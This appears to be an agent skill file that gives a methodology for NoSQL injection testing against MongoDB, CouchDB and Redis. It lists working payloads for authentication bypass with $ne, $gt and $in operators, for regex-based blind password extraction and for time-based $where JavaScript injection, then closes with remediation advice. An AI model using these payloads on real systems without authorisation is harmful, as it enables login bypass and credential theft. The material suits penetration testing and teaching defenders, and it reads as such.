---
name: offensive-nosql-injection
description: "NoSQL injection testing for MongoDB, CouchDB, Redis, and similar document/key-value stores. Covers operator injection, authentication bypass, boolean/time-based blind extraction, JavaScript ($where) injection, and aggregation-pipeline abuse. Use when testing APIs or apps backed by NoSQL databases for injection in JSON bodies, query parameters, or login forms."
---

# NoSQL Injection — Offensive Testing Methodology

## Quick Workflow

1. Identify NoSQL-backed inputs (JSON APIs, login forms, search/filter params)
2. Inject query operators to break or subvert the query
3. Confirm via authentication bypass, boolean differences, or time delays
4. Extract data with blind techniques where no output is reflected
5. Escalate to `$where` / server-side JS execution when the engine allows it

---

## Detection

### Operator Injection (JSON body)

Replace a scalar value with an operator object:

```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": "x"}}
```

A login that succeeds with `$ne`/`$gt` confirms operator injection and auth bypass.

### Operator Injection (query string)

Many parsers (qs, Express) turn bracket notation into objects:

```
username[$ne]=null&password[$ne]=null
username[$regex]=admin&password[$ne]=1
```

### Syntax-Break Probes

```
'  "  \  ;  {  }  []  ' && '1'=='1
```

Errors leaking `MongoError`, `CastError`, or BSON details confirm the backend.

---

## Exploitation

### Authentication Bypass

```json
{"user":"admin","pass":{"$gt":""}}
{"user":{"$in":["admin","administrator","root"]},"pass":{"$ne":1}}
```

### Boolean-Based Blind Extraction

Use `$regex` to confirm content character by character:

```json
{"user":"admin","pass":{"$regex":"^a"}}   // true/false oracle on response
{"user":"admin","pass":{"$regex":"^ab"}}
```

### Time-Based Blind ($where / JS)

When the engine evaluates JavaScript:

```json
{"$where": "sleep(5000)"}
{"username": "admin'; if (this.password[0]=='a'){sleep(3000)} '"}
```

### Aggregation / Operator Abuse

`$lookup`, `$out`, `$merge` can read other collections or write data when exposed
through user-controlled pipelines. Treat any user-driven aggregation stage as critical.

---

## Engine-Specific Notes

- **MongoDB**: `$ne $gt $regex $where $in $or`; JS via `$where`, `mapReduce`, `$function`.
- **CouchDB**: HTTP API; abuse `_all_docs`, design-doc views, `_temp_view`.
- **Redis**: CRLF/command injection through unsanitized values (`\r\n` to inject commands).

---

## Remediation

- Reject objects where scalars are expected; validate types server-side
- Cast inputs to string/number before building queries
- Disable server-side JavaScript (`--noscripting` / `javascriptEnabled: false`)
- Use parameterized query builders / ODM with strict schemas
- Apply least-privilege DB roles; deny `$out`/`$merge` for app users
